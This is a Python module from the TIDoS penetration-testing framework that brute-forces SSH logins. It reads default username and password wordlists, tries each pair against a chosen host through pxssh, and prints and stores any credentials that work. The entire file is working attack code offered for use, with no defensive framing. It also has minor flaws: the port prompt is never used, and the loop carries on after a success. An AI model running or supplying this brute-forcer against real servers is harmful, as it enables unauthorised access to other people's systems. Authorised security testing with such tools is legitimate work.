#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import pexpect
import time
import socket
from pexpect import pxssh
from core.Core.colors import *
from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

sshpass = []
sshuser = []

searchinfo = "SSH Bruteforcer"
info = "Crack common SSH credentials using dictionaries."
properties = {}

def sshbrute(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Brute Force Tools"
    global lvl3
    lvl3 = ""
    #print(R+'\n   ===============================')
    #print(R+'\n    S S H   B R U T E F O R C E R')
    #print(R+'   ---<>----<>----<>----<>----<>--\n')
    from core.methods.print import pbrute
    pbrute("ssh")
             
    try:
        print(GR+' [*] Testing target...')
        ip = socket.gethostbyname(web)
        m = input(O+' [§] Use IP '+R+str(ip)+O+'? (y/n) :> ')
        if m == 'y' or m == 'Y':
            pass
        elif m == 'n' or m == 'N':
            ip = input(O+' [§] Enter IP :> ')

        print(G+' [+] Target appears online...')
        port = input(GR+' [§] Enter the port (eg. 22) :> ')

        try:
            with open('files/brute-db/ssh/ssh_defuser.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    sshuser.append(u)

            with open('files/brute-db/ssh/ssh_defpass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    sshpass.append(p)
        except IOError:
            print(R+' [-] Importing wordlist failed!')

        found = False
        for user in sshuser:
            for password in sshpass:
                try:
                    connect = pxssh.pxssh()
                    connect.login(ip,str(user),password)
                    if True:
                        found = True
                        data = user + " : " + password
                        save_data(database, module, lvl1, lvl2, lvl3, name, data)
                        print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
                        break
                except Exception:
                    print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')
        if not found:
            data = "Nothing found."
            save_data(database, module, lvl1, lvl2, lvl3, name, data)
    except KeyboardInterrupt:
        if not found:
            data = "Nothing found."
            save_data(database, module, lvl1, lvl2, lvl3, name, data)
    except Exception:
        print(R+' [-] Target seems to be down!')
    print(G+" [+] Done!")

def attack(web):
    web = web.fullurl
    sshbrute(web)
